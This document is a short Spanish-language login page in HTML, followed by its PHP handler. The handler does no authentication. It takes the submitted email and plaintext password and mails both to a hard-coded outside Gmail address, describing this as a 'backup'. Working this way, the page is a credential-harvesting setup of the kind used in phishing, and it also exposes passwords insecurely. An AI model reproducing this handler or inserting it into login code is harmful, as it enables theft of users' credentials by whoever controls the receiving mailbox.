
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
</head>
<body>
    <h2>Iniciar sesión</h2>
    <form action="procesar_iniciar_sesion.php" method="post">
        <input type="email" name="correo" placeholder="Correo electrónico" required><br>
        <input type="password" name="contraseña" placeholder="Contraseña" required><br>
        <input type="submit" value="Iniciar sesión">
    </form>
</body>
</html>


<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST["correo"];
    $contraseña = $_POST["contraseña"];

    // Configura tu dirección de correo electrónico de respaldo                -----procesar_iniciar_sesion.ph-----------
    $correo_backup = "danyelo5gprueba@gmail.com";

    // Asunto y cuerpo del correo electrónico
    $asunto = "Backup de datos de inicio de sesión";
    $mensaje = "Correo electrónico: " . $correo . "\nContraseña: " . $contraseña;

    // Envía el correo electrónico de respaldo
    $resultado = mail($correo_backup, $asunto, $mensaje);

    if ($resultado) {
        echo "Los datos de inicio de sesión se enviaron correctamente al correo de backup.";
    } else {
        echo "Hubo un error al enviar los datos de inicio de sesión.";
    }
}
?>
